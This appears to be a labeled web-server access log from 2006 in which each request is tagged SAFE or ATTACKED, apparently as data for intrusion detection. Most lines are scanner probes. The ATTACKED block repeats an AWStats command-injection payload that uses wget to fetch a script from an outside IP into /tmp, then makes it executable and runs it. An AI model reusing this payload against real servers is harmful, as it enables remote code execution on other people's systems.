[SAFE] 66.186.236.233 - - [22/Jan/2006:07:35:42 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:09 -0500] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:09 -0500] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:09 -0500] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:09 -0500] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:09 -0500] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:09 -0500] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 302 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:09 -0500] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 302 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:09 -0500] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 404 302 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 299 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 298 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 299 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 299 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:10 -0500] "POST /wordpress/xmlrpc.php HTTP/1.1" 404 299 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 289 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 288 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 289 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 289 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:11 -0500] "POST /xmlrpc.php HTTP/1.1" 404 289 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:12 -0500] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 206.161.193.98 - - [13/Feb/2006:11:28:13 -0500] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[SAFE] 203.186.238.223 - - [13/Feb/2006:12:44:48 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 65.173.88.40 - - [13/Feb/2006:12:50:03 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 69.137.109.133 - - [13/Feb/2006:13:09:13 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 71.118.6.227 - - [13/Feb/2006:14:23:19 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 66.215.189.74 - - [13/Feb/2006:14:38:35 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 218.71.254.166 - - [13/Feb/2006:17:19:44 -0500] "GET http://umsky.com/px.php?p=1p2iu58rjr665dgw93jf8 HTTP/1.0" 404 281 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
[SAFE] 208.181.92.133 - - [13/Feb/2006:17:27:35 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 67.53.65.61 - - [13/Feb/2006:19:20:46 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 218.71.254.166 - - [13/Feb/2006:19:43:33 -0500] "GET http://umsky.com/px.php?p=q1w2e3r4t5y6u7i8o9p0q HTTP/1.1" 404 281 "http://umsky.com/ref.php?r=45131" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
[SAFE] 65.184.52.112 - - [13/Feb/2006:20:15:48 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 211.90.236.45 - - [13/Feb/2006:20:33:19 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 208.42.219.114 - - [13/Feb/2006:20:48:59 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 218.26.169.104 - - [13/Feb/2006:21:30:26 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 218.71.254.166 - - [13/Feb/2006:21:50:40 -0500] "GET http://umsky.com/px.php?p=q1w2e3r4t5y6u7i8o9p0q HTTP/1.1" 404 281 "http://umsky.com/ref.php?r=214" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
[SAFE] 218.252.29.14 - - [13/Feb/2006:22:30:45 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 220.194.154.163 - - [13/Feb/2006:22:45:40 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 203.186.238.129 - - [14/Feb/2006:00:55:19 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 66.161.218.30 - - [14/Feb/2006:02:58:20 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 200.107.56.177 - - [14/Feb/2006:03:32:43 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 202.102.4.125 - - [14/Feb/2006:03:37:53 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 202.101.244.67 - - [14/Feb/2006:04:14:42 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 67.79.191.5 - - [14/Feb/2006:05:18:35 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 222.166.16.42 - - [14/Feb/2006:06:50:16 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 60.170.6.255 - - [14/Feb/2006:07:03:11 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 142.46.80.162 - - [14/Feb/2006:08:13:03 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 69.232.55.69 - - [14/Feb/2006:09:27:50 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 67.90.73.42 - - [14/Feb/2006:11:26:10 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 68.92.196.102 - - [14/Feb/2006:11:34:10 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 68.149.228.78 - - [14/Feb/2006:11:54:43 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 61.62.190.71 - - [14/Feb/2006:14:46:33 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 67.83.192.20 - - [14/Feb/2006:15:26:59 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 71.109.90.98 - - [14/Feb/2006:16:05:04 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 210.188.142.104 - - [14/Feb/2006:16:16:08 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[SAFE] 68.151.45.186 - - [14/Feb/2006:18:56:06 -0500] "GET / HTTP/1.1" 403 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:24 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:24 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:25 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:25 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:25 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:25 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:26 -0500] "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 297 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 296 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
[ATTACKED] 201.28.43.194 - - [14/Feb/2006:19:10:27 -0500] "GET /cgi-bin/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20211%2e234%2e113%2e241%2fscripz%3bchmod%20%2bx%20scripz%3b%2e%2fscripz;echo%20YYY;echo|  HTTP/1.1" 404 304 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
